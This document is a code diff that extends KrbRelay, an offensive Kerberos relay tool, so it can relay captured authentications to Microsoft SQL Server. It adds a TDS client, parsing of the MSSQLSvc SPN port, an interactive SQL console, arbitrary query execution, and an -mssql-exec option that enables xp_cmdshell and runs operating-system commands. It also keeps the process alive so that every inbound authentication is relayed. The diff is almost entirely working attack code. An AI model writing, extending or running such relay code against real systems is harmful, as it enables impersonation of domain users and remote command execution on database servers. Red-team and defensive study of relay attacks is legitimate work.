@@ -163,6 +163,8 @@ namespace KrbRelay
         public static bool ntlm = false;
         public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
+        public static KrbRelay.Clients.TdsClient tdsClient = new KrbRelay.Clients.TdsClient();
+        public static int mssqlPort = 1433;
         public static HttpClientHandler handler = new HttpClientHandler();
         public static HttpClient httpClient = new HttpClient();
         public static CookieContainer CookieContainer = new CookieContainer();
@@ -220,6 +222,10 @@ namespace KrbRelay
             else if (service.ToLower() == "cifs")
             {
                 Smb.Connect();
+            }
+            else if (service.ToLower() == "mssqlsvc")
+            {
+                Mssql.Connect();
             }
 
             //overwrite security buffer
@@ -425,6 +431,13 @@ namespace KrbRelay
             Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
             //Console.WriteLine("-ews-read   <LIMIT>              Read victims inbox");
             Console.WriteLine("-ews-search <KEYWORD,KEYWORD2>   Search inbox for keywords");
+            Console.WriteLine();
+
+            Console.WriteLine("MSSQL attacks (SPN: MSSQLSvc/host.domain:1433):");
+            Console.WriteLine("-console                         Interactive SQL console");
+            Console.WriteLine("-query <SQL>                     Run a SQL batch and print the result set");
+            Console.WriteLine("-mssql-exec <COMMAND>            Enable and run xp_cmdshell <COMMAND>");
+            Console.WriteLine("(no attack)                      SELECT SYSTEM_USER / sysadmin check");
             Console.WriteLine();
 
             Console.WriteLine("Options:");
@@ -802,6 +815,36 @@ namespace KrbRelay
                         }
                         break;
 
+                    case "-QUERY":
+                    case "/QUERY":
+                        try
+                        {
+                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                                throw new Exception();
+                            attacks.Add("query", args[entry.index + 1]);
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[-] -query requires an argument");
+                            return;
+                        }
+                        break;
+
+                    case "-MSSQL-EXEC":
+                    case "/MSSQL-EXEC":
+                        try
+                        {
+                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                                throw new Exception();
+                            attacks.Add("mssql-exec", args[entry.index + 1]);
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[-] -mssql-exec requires an argument");
+                            return;
+                        }
+                        break;
+
                     //optional
                     case "-H":
                     case "/H":
@@ -885,16 +928,30 @@ namespace KrbRelay
             if (!string.IsNullOrEmpty(spn))
             {
                 service = spn.Split('/').First().ToLower();
-                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
+                if (!(new List<string> { "ldap", "cifs", "http", "mssqlsvc" }.Contains(service)))
                 {
                     Console.WriteLine("'{0}' service not supported", service);
-                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
+                    Console.WriteLine("choose from CIFS, LDAP, HTTP and MSSQLSvc");
                     return;
                 }
-                string[] d = spn.Split('.').Skip(1).ToArray();
+
+                // For MSSQLSvc the host part of the SPN carries the instance
+                // port, e.g. MSSQLSvc/srv02.domain.local:1433 . Strip it off
+                // before the FQDN/domain parsing below and remember the port.
+                string spnForParsing = spn;
+                if (service == "mssqlsvc" && spn.Contains(":"))
+                {
+                    string[] hp = spn.Split(':');
+                    int parsedPort;
+                    if (int.TryParse(hp.Last(), out parsedPort))
+                        mssqlPort = parsedPort;
+                    spnForParsing = string.Join(":", hp.Take(hp.Length - 1));
+                }
+
+                string[] d = spnForParsing.Split('.').Skip(1).ToArray();
                 domain = string.Join(".", d);
 
-                string[] dd = spn.Split('/').Skip(1).ToArray();
+                string[] dd = spnForParsing.Split('/').Skip(1).ToArray();
                 targetFQDN = string.Join(".", dd);
 
             }
@@ -1009,6 +1066,18 @@ namespace KrbRelay
                 }
                 httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));
                 //Console.WriteLine(httpClient.BaseAddress);
+            }
+            if (service == "mssqlsvc")
+            {
+                // Open the TCP socket and run PreLogin + (TLS-in-TDS) handshake
+                // now, before the COM trigger. Only the LOGIN7 leg needs the
+                // relayed AP-REQ, and that happens later in Mssql.Connect().
+                Console.WriteLine("[*] TDS: connecting to {0}:{1}", targetFQDN, mssqlPort);
+                if (!tdsClient.Connect(targetFQDN, mssqlPort))
+                {
+                    Console.WriteLine("[-] Could not set up TDS session to {0}:{1}", targetFQDN, mssqlPort);
+                    return;
+                }
             }
 
 
@@ -1229,6 +1298,22 @@ namespace KrbRelay
             if (downgrade && ntlm)
             {
                 RestoreDowngrade(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
+            }
+
+            // For MSSQL, keep the process alive after the self-trigger so that
+            // ADDITIONAL/late inbound authentications get relayed too. The
+            // cross-session trigger can produce more than one auth (the caller's
+            // t.ellis AND the target session's k.asante); the hook relays each,
+            // resets on a rejected login, and Environment.Exit(0)s on the first
+            // one MSSQL accepts (optionally gated by -relay-user). This also makes
+            // it obvious whether a second, different principal ever shows up.
+            if (service == "mssqlsvc")
+            {
+                Console.WriteLine();
+                Console.WriteLine("[*] Trigger sent. Relaying inbound authentication(s) to MSSQL...");
+                Console.WriteLine("[*] (Each attempt is logged with the principal MSSQL decrypts. Ctrl+C to stop.)");
+                while (true)
+                    Thread.Sleep(1000);
             }
         }
     }
